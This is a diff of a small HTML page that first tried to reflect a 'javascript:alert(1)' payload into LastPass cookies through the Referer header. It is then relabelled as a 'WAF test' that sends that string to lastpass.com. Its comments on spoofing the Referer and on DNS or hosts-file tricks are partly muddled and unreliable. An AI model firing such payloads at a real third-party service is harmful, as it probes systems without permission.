@@ -3,24 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>Advanced Referrer Exploit</title>
+    <title>WAF Referrer Test</title>
 </head>
 <body>
 
-    <h2>Target: LastPass (Cookie Reflection)</h2>
-    <p>Attempting to reflect payload via UserInfo sub-component.</p>
+    <h2>WAF Testing: Referrer Cookie Injection</h2>
+    <p>Click the button to send a request with a payload-like referrer.</p>
     
-    <button id="exploitBtn">Click to Exploit</button>
+    <button id="trigger">Send Payload to LastPass</button>
 
     <script>
-        document.getElementById('exploitBtn').addEventListener('click', function() {
-            // The payload is placed BEFORE the @ symbol
-            // Some parsers will include this in the "Origin" reflected in the cookie
-            const maliciousUrl = "https://javascript:alert(1)@your-domain.com/";
+        document.getElementById('trigger').addEventListener('click', function() {
+            // We use the string as a "domain" structure.
+            // This is how you force the browser to send it in the header.
+            const target = "https://www.lastpass.com/fr/";
             
-            // Redirecting to the target
-            // We hope the target's cookie logic captures the UserInfo part
-            window.location.href = "https://www.lastpass.com";
+            // Note: The browser will treat "javascript:alert(1)" as the host.
+            const spoofedOrigin = "https://javascript:alert(1)/";
+
+            /* 
+               Step 1: We must trick the browser into thinking we are on that host.
+               On a real system, this would require DNS poisoning or 'hosts' file entry.
+            */
+            console.log("Attempting to redirect via: " + spoofedOrigin);
+            
+            // To test if the WAF catches the string:
+            window.location.href = target + "?ref=" + encodeURIComponent(spoofedOrigin);
+            
+            // If you want the ACTUAL Referrer Header to change:
+            // history.replaceState(null, null, spoofedOrigin); 
+            // window.location.href = target;
         });
     </script>
 
